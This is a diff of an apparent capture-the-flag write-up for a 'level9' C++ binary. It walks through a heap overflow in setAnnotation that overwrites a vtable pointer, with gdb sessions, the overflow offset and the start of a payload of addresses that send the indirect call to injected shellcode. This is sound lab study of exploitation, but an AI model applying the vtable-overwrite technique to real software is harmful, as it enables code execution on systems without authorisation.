@@ -95,32 +95,39 @@ c++filt _Znwj
 operator new(unsigned int)
 ```
 
-
-The program dereference (reads it) EAX 2 times at main+136 and there is a call on EDX at main+159
+This is the part that is interesting for us :
 
 ```bash
-(gdb) info functions
-[...]
-0x08048510  memcpy
-0x08048510  memcpy@plt
-[...]
+mov eax, [esp+0x10]   ; EAX = ptr_B
+mov eax, [eax]        ; EAX = *(ptr_B) → vtable pointer
+mov edx, [eax]        ; EDX = *(vtable) → virtual method ptr
+call edx              ; Appel indirect
 ```
+
+What is stored at [esp + 0x10] is taken and put into EAX, therefore EAX holds B address (a pointer to an object).
+
+On the second step we read what is in EAX and put it into EAX. EAX holds B address, a pointer to the start of an object with virtual methods, therefore it points to a vtable. 
+So EAX = vtable of B
+
+On the third step we read the content of EAX (now the vtable) and store it into EDX. So EDX now has the virtual method to be called. 
+
+So schematise here is what will happen : 
+
+```plaintext
+[esp+0x10]              || 0x804a060 (adresse de B, pointer to an object)
+*ptrB = ptrB (adresse)  || 0x804a060    → 0x804a100 (pointeur vtable)         
+*ptrB= vtable           || 0x804a100    → 0xdeadbeef (adresse fonction virtuelle)              
+``` 
+
+So our goal is going to make the vtable address point towards a shellcode. 
 
 ## Getting acces to the pass
 
 Our goal : 
-1. Overflow of the buffer in setAnnotation → overwriting in the objects memory
-2. EAX now points to that object. 
-3. The programm does a double dereference on EAX to retrive the pointer of a function
-4. Thanks to the overflow, this pointer is replaced by the address of our shellcode which we injected in the buffer
-5. The edx call, calls our malicious function. 
+1. Overflow of the memcpy used in setAnnotation 
+2. Overwrite the vtable of the B object --> make it point to a shellcode  
 
 
-### Overflow of the buffer in setAnnotation → overwrriting in the objects memory
-
-There is a memcpy call, we can overflow
-
-   1.1 Finding the offset
 
 ```bash 
 (gdb) run "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
@@ -135,22 +142,6 @@ eax            0x41366441	1094083649
 So our offet is : 
 0x41366441 --> 108
 
-
-   1.2 Finding where is our buffer in eax
-
-The program uses the N object allocated on the stack at the address esp + 0x10. 
-It is at that place, that is stored a pointed which will be derefenced twice to retrieve the function that is called. 
-Therefore we must overwrite that value so that in points to our buffer (which contains the shellcode). However since there is a double dereference (*(*(...))), the value we put at esp + 0x10 must be an address that points to another address that points to the shellcode. 
-
-
-So schematise here is what will happen 
-```plaintext
-[esp+0x10] = ptr1 (adresse)         |           eax = [esp+0x10]    // eax = ptr1
-*ptr1 = ptr2 (adresse)              |           eax = *eax          // eax = ptr2
-*ptr2 = shellcode                   |           call *eax           // appel vers shellcode
-```
-
-
 ```bash 
 (gdb) b *main+136                                    // Just after the setAnnotation() call
 Breakpoint 1 at 0x804867c
@@ -159,13 +150,11 @@ Starting program: /home/user/level9/level9 'AAAA'
 
 Breakpoint 1, 0x0804867c in main ()
 (gdb) x $eax
-0x804a00c:      0x41414141                           // buffer address
+0x804a00c:      0x41414141                           // address of the a object where annotation start
 ```
-
 So we will inject our shellcode at this address. 
 
-## Making the Payload
-
+## Making the payload
 
 [esp+0x10] → pointer to 0x804a00c --> \x10\xa0\x04\x08
 0x804a00c → pointer to 0x804a010 (0x804a00c + 4) (shellcode) --> \x0c\xa0\x04\x08
